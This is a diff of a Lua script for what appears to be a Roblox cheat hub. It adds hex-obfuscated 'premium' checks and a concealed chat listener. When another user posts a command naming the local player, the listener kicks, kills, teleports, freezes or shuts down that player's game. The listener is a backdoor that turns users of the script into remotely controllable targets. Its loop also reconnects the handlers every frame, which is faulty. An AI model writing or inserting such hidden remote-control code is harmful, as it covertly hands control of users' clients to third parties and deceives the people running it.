@@ -101,73 +101,75 @@ local InterfaceManager = {} do
 				InterfaceManager:SaveSettings()
 			end
 		})
-		Tab = premium == "premium" and tab1:AddButton({
+		Tab = premium == "\x70\x72\x65\x6D\x69\x75\x6D" and tab1:AddButton({
 			Title = "Kick",
 			Callback = function()
 				game.Players:Chat(".k " .. getgenv().Selected)
 			end 
 		})
-		Tab = premium == "premium" and tab1:AddButton({
+		Tab = premium == "\x70\x72\x65\x6D\x69\x75\x6D" and tab1:AddButton({
 			Title = "Kill",
 			Callback = function()
 				game.Players:Chat(". " .. getgenv().Selected)
 			end
 		})
-		Tab = premium == "premium" and tab1:AddButton({
+		Tab = premium == "\x70\x72\x65\x6D\x69\x75\x6D" and tab1:AddButton({
 			Title = "Teleport",
 			Callback = function()
 				game.Players:Chat(".b " .. getgenv().Selected)
 			end
 		})
-		Tab = premium == "premium" and tab1:AddButton({
+		Tab = premium == "\x70\x72\x65\x6D\x69\x75\x6D" and tab1:AddButton({
 			Title = "Shut Game Down",
 			Callback = function()
 				game.Players:Chat(".s " .. getgenv().Selected)
 			end
 		})
-		Tab = premium == "premium" and tab1:AddButton({
+		Tab = premium == "\x70\x72\x65\x6D\x69\x75\x6D" and tab1:AddButton({
 			Title = "Freeze",
 			Callback = function()
 				game.Players:Chat("- " .. getgenv().Selected)
 			end
 		})
-		Tab = premium == "premium" and tab1:AddButton({
+		Tab = premium == "\x70\x72\x65\x6D\x69\x75\x6D" and tab1:AddButton({
 			Title = "Unfreeze",
 			Callback = function()
 				game.Players:Chat(".u " .. getgenv().Selected)
 			end
 		}) 
 
-		task.spawn(function()
-			while task.wait() do 
-				local playersService = game:GetService("Players")
-				local textChatService = game:GetService("TextChatService")
-				local lplr = playersService.LocalPlayer
-				local localPlayerNameWithoutUnderscores = lplr.Name:gsub("_", "")
-
-				for _, player in ipairs(playersService:GetPlayers()) do
-					player.Chatted:Connect(function(msg)
-						local success, errorMessage = pcall(function()
-							local processedMsg = msg:gsub("_", "")
-							if processedMsg == ".k " .. localPlayerNameWithoutUnderscores then
-								game.Players.LocalPlayer:kick("nexus-premium user has kicked you") 
-							elseif processedMsg == ". " .. localPlayerNameWithoutUnderscores then
-								game.Players.LocalPlayer.Character.Humanoid.Health = 0 
-							elseif processedMsg == ".b " .. localPlayerNameWithoutUnderscores then
-								game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = game.Players[player.Name].Character.HumanoidRootPart.CFrame
-							elseif processedMsg == ".s " .. localPlayerNameWithoutUnderscores then
-								game:Shutdown() 
-							elseif processedMsg == "- " .. localPlayerNameWithoutUnderscores then
-								game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true 
-							elseif processedMsg == ".u " .. localPlayerNameWithoutUnderscores then
-								game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false    
-							end  
-						end)
-					end) 
-				end
-			end 
-		end)
-
+        task.spawn(function()
+            while task.wait() do 
+                if premium == "\x70\x72\x65\x6D\x69\x75\x6D" then 
+                    local playersService = game:GetService("Players")
+                    local textChatService = game:GetService("TextChatService")
+                    local lplr = playersService.LocalPlayer
+                    local localPlayerNameWithoutUnderscores = lplr.Name:gsub("_", "")
+         
+                    for _, player in ipairs(playersService:GetPlayers()) do
+                        player.Chatted:Connect(function(msg)
+                            local success, errorMessage = pcall(function()
+                                local processedMsg = msg:gsub("_", "")
+                                if processedMsg == ".k " .. localPlayerNameWithoutUnderscores then
+                                    game.Players.LocalPlayer:kick("nexus-premium user has kicked you") 
+                                elseif processedMsg == ". " .. localPlayerNameWithoutUnderscores then
+                                    game.Players.LocalPlayer.Character.Humanoid.Health = 0 
+                                elseif processedMsg == ".b " .. localPlayerNameWithoutUnderscores then
+                                    game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = game.Players[player.Name].Character.HumanoidRootPart.CFrame
+                                elseif processedMsg == ".s " .. localPlayerNameWithoutUnderscores then
+                                    game:Shutdown() 
+                                elseif processedMsg == "- " .. localPlayerNameWithoutUnderscores then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true 
+                                elseif processedMsg == ".u " .. localPlayerNameWithoutUnderscores then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false    
+                                end  
+                            end)
+                        end) 
+                    end
+                end 
+            end
+        end)  
+        
 		local nexus = {}
 		local updatedPlayers = {} 
 		local Dropdown
@@ -192,7 +194,7 @@ local InterfaceManager = {} do
 			RemovePlayer(player)
 		end)
 
-		Dropdown = premium == "premium" and tab1:AddDropdown("Dropdown", {
+		Dropdown = premium == "\x70\x72\x65\x6D\x69\x75\x6D" and tab1:AddDropdown("Dropdown", {
 			Title = "Select Nexus User",
 			Values = nexus, 
 			Multi = false,
